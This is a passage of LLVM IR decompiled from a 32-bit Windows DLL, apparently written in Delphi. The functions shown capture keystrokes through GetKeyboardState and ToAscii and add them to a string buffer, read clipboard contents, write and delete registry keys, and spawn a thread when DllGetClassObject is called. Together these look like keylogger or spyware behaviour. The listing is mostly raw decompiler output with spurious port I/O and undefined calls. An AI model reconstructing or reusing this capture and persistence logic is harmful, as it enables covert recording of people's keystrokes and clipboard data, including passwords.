dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !529
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !530
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !530
  %6 = icmp eq i32 %5, 0, !insn.addr !531
  %7 = icmp eq i1 %6, false, !insn.addr !532
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !532

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !533
  br label %dec_label_pc_404da9, !insn.addr !533

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !534
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !534
  br label %dec_label_pc_404db2, !insn.addr !534

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !535
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !536
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !536
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !536
  %6 = inttoptr i32 %3 to i32*, !insn.addr !536
  store i32 %5, i32* %6, align 4, !insn.addr !536
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !537
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !537
  %11 = add i8 %8, %10, !insn.addr !537
  %12 = inttoptr i32 %9 to i8*, !insn.addr !537
  store i8 %11, i8* %12, align 1, !insn.addr !537
  %13 = add i32 %1, 122, !insn.addr !538
  %14 = inttoptr i32 %13 to i8*, !insn.addr !538
  %15 = load i8, i8* %14, align 1, !insn.addr !538
  %16 = udiv i32 %4, 256, !insn.addr !538
  %17 = trunc i32 %16 to i8, !insn.addr !538
  %18 = add i8 %15, %17, !insn.addr !538
  store i8 %18, i8* %14, align 1, !insn.addr !538
  %19 = load i8, i8* %7, align 4, !insn.addr !539
  %20 = load i32, i32* %eax, align 4, !insn.addr !539
  %21 = trunc i32 %20 to i8, !insn.addr !539
  %22 = add i8 %19, %21, !insn.addr !539
  %23 = icmp eq i8 %22, 0, !insn.addr !539
  %24 = inttoptr i32 %20 to i8*, !insn.addr !539
  store i8 %22, i8* %24, align 1, !insn.addr !539
  %25 = trunc i32 %3 to i16, !insn.addr !540
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !540
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !541

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !541
  br label %dec_label_pc_404dc9, !insn.addr !541

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !539
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !542
  store i32 %29, i32* %eax, align 4, !insn.addr !542
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !543

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !544, !insn.addr !539
  %31 = and i8 %30, 1, !insn.addr !539
  %32 = icmp eq i8 %31, 0, !insn.addr !539
  %33 = trunc i32 %arg4 to i16, !insn.addr !545
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !545
  %35 = inttoptr i32 %2 to i32*, !insn.addr !545
  store i32 %34, i32* %35, align 4, !insn.addr !545
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !546

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !547
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !548
  %36 = add i32 %arg4, 1, !insn.addr !549
  %37 = icmp eq i32 %36, 0, !insn.addr !549
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !550
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !550

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !551
  %39 = add i32 %38, -1, !insn.addr !551
  store i32 %39, i32* %eax, align 4, !insn.addr !551
  %40 = trunc i32 %36 to i16, !insn.addr !552
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !552
  %42 = load i32, i32* %41, align 4, !insn.addr !552
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !552
  %43 = load i32, i32* %41, align 4, !insn.addr !553
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !553
  %44 = add i32 %arg7, 105, !insn.addr !554
  %45 = inttoptr i32 %44 to i8*, !insn.addr !554
  %46 = load i8, i8* %45, align 1, !insn.addr !554
  %47 = trunc i32 %39 to i8, !insn.addr !554
  %48 = add i8 %46, %47, !insn.addr !554
  %49 = icmp ult i8 %48, %46, !insn.addr !554
  store i8 %48, i8* %45, align 1, !insn.addr !554
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !555
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !555

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !554
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !556

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !557
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !558
  %53 = load i32, i32* %52, align 4, !insn.addr !558
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !558
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !559
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !560
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !561
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !562
  %55 = add i32 %arg6, -8, !insn.addr !563
  %56 = inttoptr i32 %55 to i32*, !insn.addr !563
  store i32 0, i32* %56, align 4, !insn.addr !563
  %57 = add i32 %arg6, -12, !insn.addr !564
  %58 = inttoptr i32 %57 to i32*, !insn.addr !564
  store i32 1, i32* %58, align 4, !insn.addr !564
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !565
  ret i32 %57, !insn.addr !565

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !566

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !567
  %62 = add i8 %60, %61, !insn.addr !567
  %63 = inttoptr i32 %2 to i8*, !insn.addr !567
  store i8 %62, i8* %63, align 1, !insn.addr !567
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !568
  %65 = load i8, i8* %64, align 1, !insn.addr !568
  %66 = udiv i32 %arg3, 256, !insn.addr !568
  %67 = trunc i32 %66 to i8, !insn.addr !568
  %68 = add i8 %65, %67, !insn.addr !568
  store i8 %68, i8* %64, align 1, !insn.addr !568
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !568
  br label %dec_label_pc_404e37, !insn.addr !568

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !569
  %70 = inttoptr i32 %69 to i32*, !insn.addr !569
  store i32 0, i32* %70, align 4, !insn.addr !569
  %71 = add i32 %esp.0, -8, !insn.addr !570
  %72 = inttoptr i32 %71 to i32*, !insn.addr !570
  store i32 0, i32* %72, align 4, !insn.addr !570
  %73 = add i32 %esp.0, -12, !insn.addr !571
  %74 = inttoptr i32 %73 to i32*, !insn.addr !571
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !571
  %75 = add i32 %esp.0, -16, !insn.addr !572
  %76 = inttoptr i32 %75 to i32*, !insn.addr !572
  store i32 -2147483647, i32* %76, align 4, !insn.addr !572
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !573
  %78 = call i32 @function_4034c8(), !insn.addr !574
  %79 = add i32 %78, 1, !insn.addr !575
  %80 = add i32 %esp.0, -20, !insn.addr !576
  %81 = inttoptr i32 %80 to i32*, !insn.addr !576
  store i32 %79, i32* %81, align 4, !insn.addr !576
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !577
  br label %dec_label_pc_404e57, !insn.addr !577

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !578
  %83 = add i32 %esp.1.reload, -4, !insn.addr !579
  %84 = inttoptr i32 %83 to i32*, !insn.addr !579
  store i32 %82, i32* %84, align 4, !insn.addr !579
  %85 = add i32 %esp.1.reload, -8, !insn.addr !580
  %86 = inttoptr i32 %85 to i32*, !insn.addr !580
  store i32 1, i32* %86, align 4, !insn.addr !580
  %87 = add i32 %esp.1.reload, -12, !insn.addr !581
  %88 = inttoptr i32 %87 to i32*, !insn.addr !581
  store i32 0, i32* %88, align 4, !insn.addr !581
  %89 = add i32 %esp.1.reload, -16, !insn.addr !582
  %90 = inttoptr i32 %89 to i32*, !insn.addr !582
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !582
  %91 = add i32 %arg6, -8, !insn.addr !583
  %92 = inttoptr i32 %91 to i32*, !insn.addr !583
  %93 = load i32, i32* %92, align 4, !insn.addr !583
  %94 = add i32 %esp.1.reload, -20, !insn.addr !584
  %95 = inttoptr i32 %94 to i32*, !insn.addr !584
  store i32 %93, i32* %95, align 4, !insn.addr !584
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !585
  %97 = load i32, i32* %92, align 4, !insn.addr !586
  %98 = add i32 %esp.1.reload, -24, !insn.addr !587
  %99 = inttoptr i32 %98 to i32*, !insn.addr !587
  store i32 %97, i32* %99, align 4, !insn.addr !587
  %100 = call i32 @function_404374(), !insn.addr !588
  %101 = load i32, i32* %99, align 4, !insn.addr !589
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !590
  store i32 4214421, i32* %90, align 4, !insn.addr !591
  %102 = call i32 @"@LStrClr"(), !insn.addr !592
  ret i32 %102, !insn.addr !593
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !594
  ret i32 %0, !insn.addr !594
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !595
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !596
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !597
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !597
  %5 = inttoptr i32 %2 to i8*, !insn.addr !597
  store i8 %4, i8* %5, align 1, !insn.addr !597
  %6 = add i32 %0, 111, !insn.addr !598
  %7 = inttoptr i32 %6 to i8*, !insn.addr !598
  %8 = load i8, i8* %7, align 1, !insn.addr !598
  %9 = trunc i32 %1 to i8, !insn.addr !598
  %10 = add i8 %8, %9, !insn.addr !598
  %11 = icmp eq i8 %10, 0, !insn.addr !598
  store i8 %10, i8* %7, align 1, !insn.addr !598
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !599

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !599
  br label %dec_label_pc_404ea1, !insn.addr !599

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !598
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !600

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !544, !insn.addr !598
  %16 = and i8 %15, 1, !insn.addr !598
  %17 = icmp eq i8 %16, 0, !insn.addr !598
  %18 = trunc i32 %arg4 to i16, !insn.addr !601
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !601
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !601
  store i32 %19, i32* %20, align 4, !insn.addr !601
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !602

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !603
  %22 = icmp eq i32 %21, 0, !insn.addr !603
  store i32 %arg2, i32* %.reg2mem, !insn.addr !604
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !604

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !605
  %24 = trunc i32 %21 to i16, !insn.addr !606
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !606
  %26 = load i32, i32* %25, align 4, !insn.addr !606
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !606
  %27 = load i32, i32* %25, align 4, !insn.addr !607
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !607
  %28 = add i32 %arg7, 105, !insn.addr !608
  %29 = inttoptr i32 %28 to i8*, !insn.addr !608
  %30 = load i8, i8* %29, align 1, !insn.addr !608
  %31 = trunc i32 %23 to i8, !insn.addr !608
  %32 = add i8 %30, %31, !insn.addr !608
  %33 = icmp eq i8 %32, 0, !insn.addr !608
  store i8 %32, i8* %29, align 1, !insn.addr !608
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !609

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !610
  %34 = inttoptr i32 %23 to i8*, !insn.addr !611
  %35 = load i8, i8* %34, align 1, !insn.addr !611
  %36 = add i8 %35, %31, !insn.addr !611
  store i8 %36, i8* %34, align 1, !insn.addr !611
  %37 = add i32 %arg5, 86, !insn.addr !612
  %38 = inttoptr i32 %37 to i8*, !insn.addr !612
  %39 = load i8, i8* %38, align 1, !insn.addr !612
  %40 = trunc i32 %21 to i8, !insn.addr !612
  %41 = add i8 %39, %40, !insn.addr !612
  store i8 %41, i8* %38, align 1, !insn.addr !612
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !613
  %42 = call i32 @"@LStrClr"(), !insn.addr !614
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !615
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !616
  %44 = zext i1 %43 to i32, !insn.addr !617
  ret i32 %44, !insn.addr !617

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !618
  %46 = inttoptr i32 %45 to i8*, !insn.addr !618
  %47 = load i8, i8* %46, align 2, !insn.addr !618
  %48 = mul i8 %47, 2, !insn.addr !618
  store i8 %48, i8* %46, align 2, !insn.addr !618
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !619
  %50 = icmp eq i32* %49, null, !insn.addr !620
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !621

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !619
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !622
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !623
  %53 = icmp eq i32* %52, null, !insn.addr !624
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !625

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !626
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !627
  br label %dec_label_pc_404f04, !insn.addr !627

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !628
  br label %dec_label_pc_404f09, !insn.addr !628

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !629
  %57 = sext i1 %56 to i32, !insn.addr !629
  store i32 %57, i32* %.reg2mem, !insn.addr !630
  br label %dec_label_pc_404f0f, !insn.addr !630

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !631
  ret i32 %.reload, !insn.addr !631
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !632
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !632
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !633
  %4 = inttoptr i32 %3 to i32*, !insn.addr !634
  %5 = load i32, i32* %4, align 4, !insn.addr !634
  %6 = icmp eq i32 %5, 0, !insn.addr !634
  %7 = icmp eq i1 %6, false, !insn.addr !635
  %8 = icmp eq i1 %7, false, !insn.addr !636
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !636

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !637
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !638
  %11 = icmp eq i32* %10, null, !insn.addr !639
  %12 = icmp eq i1 %11, false, !insn.addr !640
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !640

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220648 to i32*), i32 0, i32* null), !insn.addr !641
  br label %dec_label_pc_404f50, !insn.addr !641

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !642
  store i32 0, i32* %15, align 4, !insn.addr !642
  ret i32 -2147221231, !insn.addr !643
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !644
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !645
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !646
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !647
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !647
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !647
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !648
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !649
  %3 = add i32 %2, 1, !insn.addr !649
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !649
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !650
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !651
  ret i32 0, !insn.addr !652
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !653
  ret i32 %0, !insn.addr !653
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !654
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !655
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !656
  %2 = add i32 %1, -1, !insn.addr !656
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !656
  ret i32 %0, !insn.addr !657
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !658
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !659
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !659
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !659
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !660
  %4 = call i32 @function_4071cc(), !insn.addr !661
  %5 = icmp ne i32 %4, 0, !insn.addr !662
  %6 = icmp eq i1 %5, false, !insn.addr !663
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !664
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !664

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_407268(), !insn.addr !665
  %8 = call i32 @"@LStrDelete"(), !insn.addr !666
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !667
  br label %dec_label_pc_4050bb, !insn.addr !667

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_407268(), !insn.addr !668
  %10 = call i32 @"@LStrDelete"(), !insn.addr !669
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !670
  br label %dec_label_pc_4050bb, !insn.addr !670

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !671
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !672
  %14 = udiv i32 %1, 65536, !insn.addr !673
  %15 = and i32 %14, 255, !insn.addr !674
  %16 = inttoptr i32 %15 to i16*, !insn.addr !675
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !676
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !677
  %19 = icmp eq i32 %18, 1, !insn.addr !678
  %20 = icmp eq i1 %19, false, !insn.addr !679
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !679
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !679

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406f30(), !insn.addr !680
  %22 = icmp eq i32 %21, 0, !insn.addr !681
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !682
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !682

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !683
  %24 = icmp sgt i32 %23, 15, !insn.addr !684
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !684
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !684

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_407268(), !insn.addr !685
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !686
  %27 = call i32 @"@LStrInsert"(), !insn.addr !687
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !687
  br label %dec_label_pc_4050bb, !insn.addr !687

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !688
  %29 = load i32, i32* %28, align 4, !insn.addr !688
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !689
  %30 = add i32 %esp.0.reload, 8, !insn.addr !690
  %31 = inttoptr i32 %30 to i32*, !insn.addr !690
  store i32 4215003, i32* %31, align 4, !insn.addr !690
  %32 = call i32 @"@LStrClr"(), !insn.addr !691
  ret i32 %32, !insn.addr !692
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !693
  ret i32 %0, !insn.addr !693
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !694
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !695
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !696
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !696
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !696
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !697
  %2 = call i32 @function_4071cc(), !insn.addr !698
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !699
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !700
  %4 = add i32 %1, 8, !insn.addr !701
  %5 = inttoptr i32 %4 to i32*, !insn.addr !701
  store i32 4215210, i32* %5, align 4, !insn.addr !701
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !702
  ret i32 %6, !insn.addr !703
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !704
  ret i32 %0, !insn.addr !704
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !705
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !706
}

